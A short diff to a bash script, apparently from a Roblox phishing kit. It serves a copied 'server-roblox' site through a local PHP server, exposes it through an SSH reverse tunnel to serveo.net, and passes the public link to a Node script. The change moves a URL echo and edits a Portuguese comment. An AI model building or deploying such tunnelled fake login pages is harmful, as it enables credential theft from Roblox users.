@@ -57,8 +57,6 @@ echo -e "Date : $date_time\nUser : $whoami"
 cp -rf server-roblox/ .server/www
 cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
 start_serveo
-node index.js
-echo -e "${WHITE}[-] URL: ${GREEN} $send_url"
 else
 sleep 0.74
 echo -e ""
@@ -84,9 +82,9 @@ start_serveo() {
     $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$PORT' serveo.net 2> /dev/null > .server/www/linksender ' &
     sleep 7
     send_url=$(grep -o "https://[0-9a-z]*\.serveo.net" .server/www/linksender)
-    
-    # Inicia o server.js passando send_url como argumento
+    # Envia o send_url para o servidor Node.js via HTTP
     node index.js "$send_url"
+    echo -e "${WHITE}[-] URL: ${GREEN} $send_url"
 }
 
 start;
